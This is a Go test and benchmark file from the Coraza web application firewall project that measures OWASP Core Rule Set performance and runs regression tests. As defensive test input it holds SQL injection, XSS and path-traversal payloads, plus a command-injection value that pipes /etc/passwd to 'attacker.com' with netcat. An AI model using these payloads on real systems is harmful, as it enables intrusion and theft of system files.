// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

// These benchmarks don't currently compile with TinyGo
//go:build !tinygo

package coreruleset

import (
	"bufio"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/bmatcuk/doublestar/v4"
	albedo "github.com/coreruleset/albedo/server"
	"github.com/coreruleset/go-ftw/v2/config"
	"github.com/coreruleset/go-ftw/v2/output"
	"github.com/coreruleset/go-ftw/v2/runner"
	"github.com/coreruleset/go-ftw/v2/test"
	"github.com/rs/zerolog"

	coreruleset "github.com/corazawaf/coraza-coreruleset/v4"
	crstests "github.com/corazawaf/coraza-coreruleset/v4/tests"
	"github.com/corazawaf/coraza/v3"
	"github.com/corazawaf/coraza/v3/experimental"
	txhttp "github.com/corazawaf/coraza/v3/http"
	"github.com/corazawaf/coraza/v3/types"
)

func BenchmarkCRSCompilation(b *testing.B) {
	rec, err := os.ReadFile(filepath.Join("..", "..", "coraza.conf-recommended"))
	if err != nil {
		b.Fatal(err)
	}
	for i := 0; i < b.N; i++ {
		waf, err := coraza.NewWAF(coraza.NewWAFConfig().
			WithRootFS(coreruleset.FS).
			WithDirectives(string(rec)).
			WithDirectives("Include @crs-setup.conf.example").
			WithDirectives("Include @owasp_crs/*.conf"))
		if err != nil {
			b.Fatal(err)
		}
		if closer, ok := waf.(experimental.WAFCloser); ok {
			closer.Close()
		}
	}
}

func BenchmarkCRSSimpleGET(b *testing.B) {
	waf := crsWAF(b)

	b.ResetTimer() // only benchmark execution, not compilation
	for i := 0; i < b.N; i++ {
		tx := waf.NewTransaction()
		tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
		tx.ProcessURI("/some_path/with?parameters=and&other=Stuff", "GET", "HTTP/1.1")
		tx.AddRequestHeader("Host", "localhost")
		tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
		tx.AddRequestHeader("Accept", "application/json")
		tx.ProcessRequestHeaders()
		if _, err := tx.ProcessRequestBody(); err != nil {
			b.Error(err)
		}
		tx.AddResponseHeader("Content-Type", "application/json")
		tx.ProcessResponseHeaders(200, "OK")
		if _, err := tx.ProcessResponseBody(); err != nil {
			b.Error(err)
		}
		tx.ProcessLogging()
		if err := tx.Close(); err != nil {
			b.Error(err)
		}
	}
}

func BenchmarkCRSSimplePOST(b *testing.B) {
	waf := crsWAF(b)

	b.ReportAllocs()
	b.ResetTimer() // only benchmark execution, not compilation
	for i := 0; i < b.N; i++ {
		tx := waf.NewTransaction()
		tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
		tx.ProcessURI("/some_path/with?parameters=and&other=Stuff", "POST", "HTTP/1.1")
		tx.AddRequestHeader("Host", "localhost")
		tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
		tx.AddRequestHeader("Accept", "application/json")
		tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
		tx.ProcessRequestHeaders()
		if _, _, err := tx.WriteRequestBody([]byte("parameters2=and&other2=Stuff")); err != nil {
			b.Error(err)
		}
		if _, err := tx.ProcessRequestBody(); err != nil {
			b.Error(err)
		}
		tx.AddResponseHeader("Content-Type", "application/json")
		tx.ProcessResponseHeaders(200, "OK")
		if _, err := tx.ProcessResponseBody(); err != nil {
			b.Error(err)
		}
		tx.ProcessLogging()
		if err := tx.Close(); err != nil {
			b.Error(err)
		}
	}
}

func BenchmarkCRSLargePOST(b *testing.B) {
	waf := crsWAF(b)

	postPayload := []byte(fmt.Sprintf("parameters2=and&other2=%s", strings.Repeat("a", 10000)))

	b.ReportAllocs()
	b.ResetTimer() // only benchmark execution, not compilation
	for i := 0; i < b.N; i++ {
		tx := waf.NewTransaction()
		tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
		tx.ProcessURI("/some_path/with?parameters=and&other=Stuff", "POST", "HTTP/1.1")
		tx.AddRequestHeader("Host", "localhost")
		tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
		tx.AddRequestHeader("Accept", "application/json")
		tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
		tx.ProcessRequestHeaders()
		if _, _, err := tx.WriteRequestBody(postPayload); err != nil {
			b.Error(err)
		}
		if _, err := tx.ProcessRequestBody(); err != nil {
			b.Error(err)
		}
		tx.AddResponseHeader("Content-Type", "application/json")
		tx.ProcessResponseHeaders(200, "OK")
		if _, err := tx.ProcessResponseBody(); err != nil {
			b.Error(err)
		}
		tx.ProcessLogging()
		if err := tx.Close(); err != nil {
			b.Error(err)
		}
	}
}

// BenchmarkCRSPrefilter measures CRS request processing across diverse traffic
// patterns. Run with and without the coraza.rule.rx_prefilter build tag and
// compare via benchstat:
//
//	go test -bench=BenchmarkCRSPrefilter -benchmem -count=6 ./testing/coreruleset/ > baseline.txt
//	go test -tags coraza.rule.rx_prefilter -bench=BenchmarkCRSPrefilter -benchmem -count=6 ./testing/coreruleset/ > prefilter.txt
//	benchstat baseline.txt prefilter.txt
func BenchmarkCRSPrefilter(b *testing.B) {
	waf := crsWAF(b)

	chromeUA := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

	// --- Benign payloads ---

	formBody := []byte("first_name=John&last_name=Doe&email=john.doe@example.com&phone=555-0123&address=123+Main+Street&city=Springfield&state=IL&zip=62701")

	multipartBoundary := "----WebKitFormBoundaryABC123"
	multipartBody := []byte("------WebKitFormBoundaryABC123\r\n" +
		"Content-Disposition: form-data; name=\"description\"\r\n\r\n" +
		"Quarterly report Q1 2025\r\n" +
		"------WebKitFormBoundaryABC123\r\n" +
		"Content-Disposition: form-data; name=\"file\"; filename=\"report.pdf\"\r\n" +
		"Content-Type: application/pdf\r\n\r\n" +
		strings.Repeat("ABCDEFGHIJ", 100) + "\r\n" +
		"------WebKitFormBoundaryABC123--\r\n")

	graphqlBody := []byte(`{"query":"query GetUser($id: ID!) { user(id: $id) { name email posts { title createdAt } } }","variables":{"id":"usr_42"}}`)

	// --- Attack payloads ---

	sqliBody := []byte("username=admin' OR '1'='1&password=anything' UNION SELECT * FROM information_schema.tables--")
	xssBody := []byte("comment=<img src=x onerror=alert(1)>&post_id=42")
	cmdiBody := []byte("host=127.0.0.1; cat /etc/passwd | nc attacker.com 4444")

	// Helper: full transaction lifecycle for a GET request.
	doGET := func(b *testing.B, uri string, headers [][2]string) {
		b.Helper()
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)
			tx.ProcessURI(uri, "GET", "HTTP/1.1")
			tx.AddRequestHeader("Host", "app.example.com")
			tx.AddRequestHeader("User-Agent", chromeUA)
			for _, h := range headers {
				tx.AddRequestHeader(h[0], h[1])
			}
			tx.ProcessRequestHeaders()
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Fatal(err)
			}
			tx.AddResponseHeader("Content-Type", "application/json")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Fatal(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Fatal(err)
			}
		}
	}

	// Helper: full transaction lifecycle for a POST request.
	doPOST := func(b *testing.B, uri, contentType string, body []byte, headers [][2]string) {
		b.Helper()
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)
			tx.ProcessURI(uri, "POST", "HTTP/1.1")
			tx.AddRequestHeader("Host", "app.example.com")
			tx.AddRequestHeader("User-Agent", chromeUA)
			tx.AddRequestHeader("Content-Type", contentType)
			for _, h := range headers {
				tx.AddRequestHeader(h[0], h[1])
			}
			tx.ProcessRequestHeaders()
			if _, _, err := tx.WriteRequestBody(body); err != nil {
				b.Fatal(err)
			}
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Fatal(err)
			}
			tx.AddResponseHeader("Content-Type", "application/json")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Fatal(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Fatal(err)
			}
		}
	}

	// ===== Benign traffic =====

	b.Run("Benign/APICall", func(b *testing.B) {
		doGET(b,
			"/api/v2/users?page=1&limit=50&sort=created_at&order=desc",
			[][2]string{
				{"Accept", "application/json"},
				{"Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfNDIifQ.signature"},
			},
		)
	})

	b.Run("Benign/FormSubmission", func(b *testing.B) {
		doPOST(b,
			"/account/profile/update",
			"application/x-www-form-urlencoded",
			formBody,
			[][2]string{{"Accept", "text/html"}, {"Referer", "https://app.example.com/account/profile"}},
		)
	})

	b.Run("Benign/FileUpload", func(b *testing.B) {
		doPOST(b,
			"/api/v1/documents/upload",
			"multipart/form-data; boundary="+multipartBoundary,
			multipartBody,
			[][2]string{{"Accept", "application/json"}},
		)
	})

	b.Run("Benign/StaticAsset", func(b *testing.B) {
		doGET(b,
			"/assets/css/main.min.css",
			[][2]string{
				{"Accept", "text/css,*/*;q=0.1"},
				{"Accept-Encoding", "gzip, deflate, br"},
				{"If-None-Match", `"v2-abc123def456"`},
			},
		)
	})

	b.Run("Benign/GraphQL", func(b *testing.B) {
		doPOST(b,
			"/graphql",
			"application/json",
			graphqlBody,
			[][2]string{{"Accept", "application/json"}},
		)
	})

	// ===== Attack traffic =====

	b.Run("Attack/SQLi_QueryString", func(b *testing.B) {
		doGET(b,
			"/search?q=' OR 1=1 UNION SELECT username,password FROM users--&category=all",
			[][2]string{{"Accept", "text/html"}},
		)
	})

	b.Run("Attack/SQLi_Body", func(b *testing.B) {
		doPOST(b,
			"/login",
			"application/x-www-form-urlencoded",
			sqliBody,
			nil,
		)
	})

	b.Run("Attack/SQLi_Header", func(b *testing.B) {
		doGET(b,
			"/dashboard",
			[][2]string{
				{"Accept", "text/html"},
				{"Cookie", "session=abc123; prefs=' UNION SELECT 1,2,3--"},
				{"Referer", "http://example.com/search?q='; DROP TABLE users;--"},
			},
		)
	})

	b.Run("Attack/XSS_QueryString", func(b *testing.B) {
		doGET(b,
			`/search?q=<script>alert(document.cookie)</script>&page=1`,
			[][2]string{{"Accept", "text/html"}},
		)
	})

	b.Run("Attack/XSS_Body", func(b *testing.B) {
		doPOST(b,
			"/api/comments",
			"application/x-www-form-urlencoded",
			xssBody,
			[][2]string{{"Accept", "application/json"}},
		)
	})

	b.Run("Attack/PathTraversal", func(b *testing.B) {
		doGET(b,
			"/files/download?path=..%2f..%2f..%2fetc%2fpasswd",
			[][2]string{{"Accept", "application/octet-stream"}},
		)
	})

	b.Run("Attack/CMDi_Body", func(b *testing.B) {
		doPOST(b,
			"/api/tools/ping",
			"application/x-www-form-urlencoded",
			cmdiBody,
			nil,
		)
	})

	// ===== Mixed traffic (90% benign, 10% attack) =====

	b.Run("Mixed/90Benign_10Attack", func(b *testing.B) {
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)

			if i%10 == 0 {
				// Attack: SQLi in query string
				tx.ProcessURI("/search?q=' OR 1=1 UNION SELECT username,password FROM users--&category=all", "GET", "HTTP/1.1")
			} else {
				// Benign: API call
				tx.ProcessURI("/api/v2/users?page=1&limit=50&sort=created_at&order=desc", "GET", "HTTP/1.1")
			}

			tx.AddRequestHeader("Host", "app.example.com")
			tx.AddRequestHeader("User-Agent", chromeUA)
			tx.AddRequestHeader("Accept", "application/json")
			tx.ProcessRequestHeaders()
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Fatal(err)
			}
			tx.AddResponseHeader("Content-Type", "application/json")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Fatal(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Fatal(err)
			}
		}
	})
}

// BenchmarkCRSTransformationCache measures the transformation cache performance
// across different request sizes. The transformation cache benefit scales with
// (number of arguments) × (number of rules sharing transformation prefixes),
// so these benchmarks exercise that by varying argument counts and value sizes.
func BenchmarkCRSTransformationCache(b *testing.B) {
	waf := crsWAF(b)

	// Small: 2 query params, short values (typical simple API call)
	smallQuery := "user=admin&action=view"
	// Medium: 10 params with moderate values (typical form submission)
	mediumParams := []string{
		"username=johndoe",
		"email=john@example.com",
		"first_name=John",
		"last_name=Doe",
		"address=123+Main+Street",
		"city=Springfield",
		"state=IL",
		"zip=62701",
		"phone=555-0123",
		"comment=This+is+a+test+comment+with+some+content",
	}
	mediumBody := strings.Join(mediumParams, "&")
	// Large: 30 params with longer values (complex form, many args)
	var largeParams []string
	for i := 0; i < 30; i++ {
		largeParams = append(largeParams, fmt.Sprintf("field_%d=%s", i, strings.Repeat("value", 20)))
	}
	largeBody := strings.Join(largeParams, "&")

	b.Run("SmallGET_2params", func(b *testing.B) {
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
			tx.ProcessURI("GET", "/api/endpoint?"+smallQuery, "HTTP/1.1")
			tx.AddRequestHeader("Host", "localhost")
			tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
			tx.AddRequestHeader("Accept", "application/json")
			tx.ProcessRequestHeaders()
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Error(err)
			}
			tx.AddResponseHeader("Content-Type", "application/json")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Error(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Error(err)
			}
		}
	})

	b.Run("MediumPOST_10params", func(b *testing.B) {
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
			tx.ProcessURI("POST", "/api/submit?source=web", "HTTP/1.1")
			tx.AddRequestHeader("Host", "localhost")
			tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
			tx.AddRequestHeader("Accept", "text/html")
			tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
			tx.ProcessRequestHeaders()
			if _, _, err := tx.WriteRequestBody([]byte(mediumBody)); err != nil {
				b.Error(err)
			}
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Error(err)
			}
			tx.AddResponseHeader("Content-Type", "text/html")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Error(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Error(err)
			}
		}
	})

	b.Run("LargePOST_30params", func(b *testing.B) {
		b.ReportAllocs()
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			tx := waf.NewTransaction()
			tx.ProcessConnection("127.0.0.1", 8080, "127.0.0.1", 8080)
			tx.ProcessURI("POST", "/api/bulk?source=web&format=json", "HTTP/1.1")
			tx.AddRequestHeader("Host", "localhost")
			tx.AddRequestHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")
			tx.AddRequestHeader("Accept", "text/html")
			tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
			tx.ProcessRequestHeaders()
			if _, _, err := tx.WriteRequestBody([]byte(largeBody)); err != nil {
				b.Error(err)
			}
			if _, err := tx.ProcessRequestBody(); err != nil {
				b.Error(err)
			}
			tx.AddResponseHeader("Content-Type", "text/html")
			tx.ProcessResponseHeaders(200, "OK")
			if _, err := tx.ProcessResponseBody(); err != nil {
				b.Error(err)
			}
			tx.ProcessLogging()
			if err := tx.Close(); err != nil {
				b.Error(err)
			}
		}
	})
}

func TestFTW(t *testing.T) {
	conf := coraza.NewWAFConfig()

	rec, err := os.ReadFile(filepath.Join("..", "..", "coraza.conf-recommended"))
	if err != nil {
		t.Fatal(err)
	}

	customTestingConfig := `
SecResponseBodyMimeType text/plain

# Rule 900005 from https://github.com/coreruleset/coreruleset/blob/v4.0/dev/tests/regression/README.md#requirements
SecAction "id:900005,\
  phase:1,\
  nolog,\
  pass,\
  ctl:ruleEngine=DetectionOnly,\
  ctl:ruleRemoveById=910000,\
  setvar:tx.blocking_paranoia_level=4,\
  setvar:tx.crs_validate_utf8_encoding=1,\
  setvar:tx.arg_name_length=100,\
  setvar:tx.arg_length=400,\
  setvar:tx.total_arg_length=64000,\
  setvar:tx.max_num_args=255,\
  setvar:tx.max_file_size=64100,\
  setvar:tx.combined_file_sizes=65535"

# Write the value from the X-CRS-Test header as a marker to the log
# Requests with X-CRS-Test header will not be matched by any rule. See https://github.com/coreruleset/go-ftw/pull/133
SecRule REQUEST_HEADERS:X-CRS-Test "@rx ^.*$" \
  "id:999999,\
  phase:1,\
  pass,\
  t:none,\
  log,\
  msg:'X-CRS-Test %{MATCHED_VAR}',\
  ctl:ruleRemoveById=1-999999"
`
	// Configs are loaded with a precise order:
	// 1. Coraza config
	// 2. Custom Rules for testing and eventually overrides of the basic Coraza config
	// 3. CRS basic config
	// 4. CRS rules (on top of which are applied the previously defined SecDefaultAction)
	conf = conf.
		WithRootFS(coreruleset.FS).
		WithDirectives(string(rec)).
		WithDirectives(customTestingConfig).
		WithDirectives("Include @crs-setup.conf.example").
		WithDirectives("Include @owasp_crs/*.conf")

	errorPath := filepath.Join(t.TempDir(), "error.log")
	errorFile, err := os.Create(errorPath)
	if err != nil {
		t.Fatalf("failed to create error log: %v", err)
	}
	defer errorFile.Close()

	errorWriter := bufio.NewWriter(errorFile)
	conf = conf.WithErrorCallback(func(rule types.MatchedRule) {
		msg := rule.ErrorLog() + "\n"
		if _, err := io.WriteString(errorWriter, msg); err != nil {
			t.Fatal(err)
		}
		if err := errorWriter.Flush(); err != nil {
			t.Fatal(err)
		}
	})

	waf, err := coraza.NewWAF(conf)
	if err != nil {
		t.Fatal(err)
	}
	if closer, ok := waf.(experimental.WAFCloser); ok {
		defer closer.Close()
	}

	// CRS regression tests are expected to be run with https://github.com/coreruleset/albedo as backend server
	s := httptest.NewServer(txhttp.WrapHandler(waf, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		// TODO: Investigate why we need to enforce text/plain to have response body tests working.
		// Check the Content-Type set by albed and SecResponseBodyMimeType
		w.Header().Set("Content-Type", "text/plain")
		albedo.Handler().ServeHTTP(w, r)
	})))
	defer s.Close()

	var tests []*test.FTWTest
	err = doublestar.GlobWalk(crstests.FS, "**/*.yaml", func(path string, d os.DirEntry) error {
		yaml, err := fs.ReadFile(crstests.FS, path)
		if err != nil {
			return err
		}
		ftwt, err := test.GetTestFromYaml(yaml, path)
		if err != nil {
			return err
		}
		tests = append(tests, ftwt)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(tests) == 0 {
		t.Fatal("no tests found")
	}

	u, _ := url.Parse(s.URL)
	host := u.Hostname()
	port, _ := strconv.Atoi(u.Port())
	// TODO(anuraaga): Don't use global config for FTW for better support of programmatic.
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	cfg, err := config.NewConfigFromFile(".ftw.yml")
	if err != nil {
		t.Fatal(err)
	}
	cfg.LogFile = errorPath
	cfg.TestOverride.Overrides.DestAddr = &host
	cfg.TestOverride.Overrides.Port = &port

	// loadMultiphaseOverrides has different implementations depending on coraza.rule.multiphase_evaluation
	// build tag. If enabled, it will include multiphase specific ignored tests.
	if err := loadMultiphaseOverrides(cfg); err != nil {
		t.Fatal(err)
	}
	runnerCfg := config.NewRunnerConfiguration(cfg)
	runnerCfg.ReadTimeout = 3 * time.Second // Defaults to 1s but looks to be not enough in the CI
	if err := runnerCfg.LoadPlatformOverrides(".ftw-overrides.yml"); err != nil {
		t.Fatal(err)
	}
	res, err := runner.Run(runnerCfg, tests, output.NewOutput("quiet", os.Stdout))
	if err != nil {
		t.Fatal(err)
	}
	totalIgnored := len(res.Stats.Ignored)
	if totalIgnored > 0 {
		t.Logf("[info] %d ignored tests: %v", totalIgnored, res.Stats.Ignored)
	}
	totalFailed := len(res.Stats.Failed)
	if totalFailed > 0 {
		t.Errorf("[fatal] %d failed tests: %v", totalFailed, res.Stats.Failed)
	}
}

func BenchmarkCRSMultiWAFCompilation(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for w := 0; w < 10; w++ {
			waf := crsWAF(b)
			if closer, ok := waf.(experimental.WAFCloser); ok {
				closer.Close()
			}
		}
	}
}

func BenchmarkCRSMemoizeSpeedup(b *testing.B) {
	for i := 0; i < b.N; i++ {
		// Cold compilation (first WAF)
		cold := time.Now()
		waf1 := crsWAF(b)
		coldDur := time.Since(cold)
		if closer, ok := waf1.(experimental.WAFCloser); ok {
			closer.Close()
		}

		// Warm compilation (second WAF, patterns already cached)
		warm := time.Now()
		waf2 := crsWAF(b)
		warmDur := time.Since(warm)
		if closer, ok := waf2.(experimental.WAFCloser); ok {
			closer.Close()
		}

		b.Logf("cold=%s warm=%s speedup=%.1fx", coldDur, warmDur, float64(coldDur)/float64(warmDur))
	}
}

func TestCRSCloseReleasesMemory(t *testing.T) {
	if os.Getenv("CORAZA_RUN_CRS_CLOSE_MEMTEST") == "" {
		t.Skip("skipping memory diagnostic test; set CORAZA_RUN_CRS_CLOSE_MEMTEST=1 to run")
	}

	var m runtime.MemStats

	runtime.GC()
	runtime.ReadMemStats(&m)
	baseHeap := m.HeapAlloc

	// Build WAFs directly (not via crsWAF) so we control the lifecycle
	// without t.Cleanup holding references that prevent GC.
	rec, err := os.ReadFile(filepath.Join("..", "..", "coraza.conf-recommended"))
	if err != nil {
		t.Fatal(err)
	}
	conf := coraza.NewWAFConfig().
		WithRootFS(coreruleset.FS).
		WithDirectives(string(rec)).
		WithDirectives("Include @crs-setup.conf.example").
		WithDirectives("Include @owasp_crs/*.conf")

	wafs := make([]coraza.WAF, 5)
	for i := range wafs {
		waf, err := coraza.NewWAF(conf)
		if err != nil {
			t.Fatal(err)
		}
		wafs[i] = waf
	}

	runtime.GC()
	runtime.ReadMemStats(&m)
	peakHeap := m.HeapAlloc

	for _, waf := range wafs {
		if closer, ok := waf.(experimental.WAFCloser); ok {
			closer.Close()
		}
	}

	runtime.GC()
	runtime.ReadMemStats(&m)
	afterHeap := m.HeapAlloc

	t.Logf("base=%dMiB peak=%dMiB after_close=%dMiB released=%dMiB",
		baseHeap/1024/1024, peakHeap/1024/1024,
		afterHeap/1024/1024, (peakHeap-afterHeap)/1024/1024)
}

func crsWAF(t testing.TB) coraza.WAF {
	t.Helper()
	rec, err := os.ReadFile(filepath.Join("..", "..", "coraza.conf-recommended"))
	if err != nil {
		t.Fatal(err)
	}
	customTestingConfig := `
SecResponseBodyMimeType text/plain
SecDefaultAction "phase:3,log,auditlog,pass"
SecDefaultAction "phase:4,log,auditlog,pass"

# Rule 900005 from https://github.com/coreruleset/coreruleset/blob/v4.0/dev/tests/regression/README.md#requirements
SecAction "id:900005,\
  phase:1,\
  nolog,\
  pass,\
  ctl:ruleEngine=DetectionOnly,\
  ctl:ruleRemoveById=910000,\
  setvar:tx.blocking_paranoia_level=4,\
  setvar:tx.crs_validate_utf8_encoding=1,\
  setvar:tx.arg_name_length=100,\
  setvar:tx.arg_length=400,\
  setvar:tx.total_arg_length=64000,\
  setvar:tx.max_num_args=255,\
  setvar:tx.max_file_size=64100,\
  setvar:tx.combined_file_sizes=65535"
`
	conf := coraza.NewWAFConfig().
		WithRootFS(coreruleset.FS).
		WithDirectives(string(rec)).
		WithDirectives(customTestingConfig).
		WithDirectives("Include @crs-setup.conf.example").
		WithDirectives("Include @owasp_crs/*.conf")

	waf, err := coraza.NewWAF(conf)
	if err != nil {
		t.Fatal(err)
	}
	if closer, ok := waf.(experimental.WAFCloser); ok {
		// Avoid registering per-iteration Cleanup callbacks in benchmarks, as that
		// can retain WAF instances and skew memory/benchmark results. Benchmarks
		// calling crsWAF are expected to close the WAF explicitly if needed.
		if _, isBenchmark := t.(*testing.B); !isBenchmark {
			t.Cleanup(func() { closer.Close() })
		}
	}

	return waf
}
